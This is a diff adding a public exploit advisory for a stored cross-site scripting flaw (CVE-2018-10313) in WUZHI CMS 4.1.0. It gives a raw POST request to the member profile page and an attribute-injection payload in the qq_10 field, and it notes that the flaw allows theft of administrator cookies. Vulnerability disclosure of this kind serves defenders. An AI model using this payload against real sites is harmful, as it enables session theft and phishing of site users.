@@ -1,0 +1,16 @@
+# Exploit Title: WUZHI CMS 4.1.0 XSS Vulnerability
+# Date: 2018-4-23
+# Exploit Author: jiguang (s1@jiguang.in)
+# Vendor Homepage: https://github.com/wuzhicms/wuzhicms
+# Software Link: https://github.com/wuzhicms/wuzhicms
+# Version: 4.1.0
+# CVE: CVE-2018-10313
+
+An issue was discovered in WUZHI CMS 4.1.0 (https://github.com/wuzhicms/wuzhicms/issues/133)
+There is a xss vulnerability that can stealing administrator cookie, fishing attack, etc. via the form%5Bqq_10%5D parameter post to the /index.php?m=member&f=index&v=profile&set_iframe=1
+
+`POST /wuzhi/www/index.php?m=member&f=index&v=profile&set_iframe=1 HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://localhost/wuzhi/www/index.php?m=member&f=index&v=profile&set_iframe=1 Content-Type: application/x-www-form-urlencoded Content-Length: 74 Cookie: PHPSESSID=uk4g8bm4l96iv5rl6ej2re83a3; EkT_siteid=Wl70z0XOgxO6TVPS70twsg%3D%3D; EkT_qkey=jiPLTZIrWUySV8FmwZwibPjlIPfq0nTj; EkT_userkeys=e7%2FCIDS8IFYxTUG8kAb7Ww%3D%3D; EkT_truename=yuduo; EkT_auth=lwMUjMOtAXpsQyZViV3zkNdoXMK7Up5NWRRI4Ro4FDKECQHhZ1ntK0WcBotqHVYyx3z9AYABYpAsEx4OdqcExF5S1d7Gw31AvtN07WdqMw28yLCoyNv8RA%3D%3D; EkT__uid=ocqUyYLd7bm05%2Ft4KcS%2B6Q%3D%3D; EkT__username=URDJ1YisL%2BXkt7Mzgg3aNA%3D%3D; EkT__groupid=aZR0cJTYiMBkLfoq8PwJ0g%3D%3D; EkT_modelid=10; tFf_uid=ej6BNn7ulZVYfrHwlgXMvg%3D%3D; tFf_username=YuhCykTKqrPt5fHl2zROVg%3D%3D; tFf_wz_name=IAFonn80xi%2FUvXNXx8uR%2FQ%3D%3D; tFf_siteid=dUi1cO%2FrqMr0atgyt9b%2BNw%3D%3D; tFf_auth=EVUCupGrAYuOzHKFNYqbS%2B39rd2Ynyn74kyNU3KlUwiQCJGQMAgEMU0go7SqkJsUA8kNZq6BsF5nFNbEeL5ehNOQ5DkCGZ4h4JnRqFB8UFIh9kWHsJe84Q%3D%3D; tFf__uid=FM0wd0X5ONWZsKHK8N3j%2Fw%3D%3D; tFf__username=haycqodNzDQbfpqnsWY3xA%3D%3D; tFf__groupid=I7EFExZnf2tvQCMhDV%2B1nA%3D%3D; tFf_truename=yuduo; tFf_modelid=10; SwW_uid=Bk1YojgAB4vSAv%2BmPy3WYg%3D%3D; SwW_username=BTEh6yj6GaEMdyByi0JOZw%3D%3D; SwW_wz_name=8vypKiZ6Ck1JQloRN3gGZQ%3D%3D; SwW_siteid=jm2uH%2FJAmU8uh1X4AlQ1nQ%3D%3D; SwW_qkey=sSAglhFB%2F04GAI1A3H4vDpnfBjktIjQO; SwW_truename=yuyuyu; SwW_auth=qVG8d0BqbIYaHf7emEsG%2Bz%2Fo4LTxYomIRzLjUyu1wWd0BfW4Eucw1UXVm3OTEBexHDGzzwvYarSW62r%2F%2BZrP6RZloFSgyn1%2B5QSsfVv8XDbbIN5Wzd32rQ%3D%3D; SwW__uid=SQgSrskOQqPeThE7vxpQuQ%3D%3D; SwW__username=ZnY2K%2B8IB6WgdsrHTD%2F%2Fzg%3D%3D; SwW__groupid=wVnor3QYe03CC%2B9JInwPIQ%3D%3D; SwW_modelid=10 Connection: close Upgrade-Insecure-Requests: 1
+
+`form%5Bqq_10%5D`=234234" onmouseover="confirm(22)&submit=%E6%8F%90%E4%BA%A4`
+
+------------------
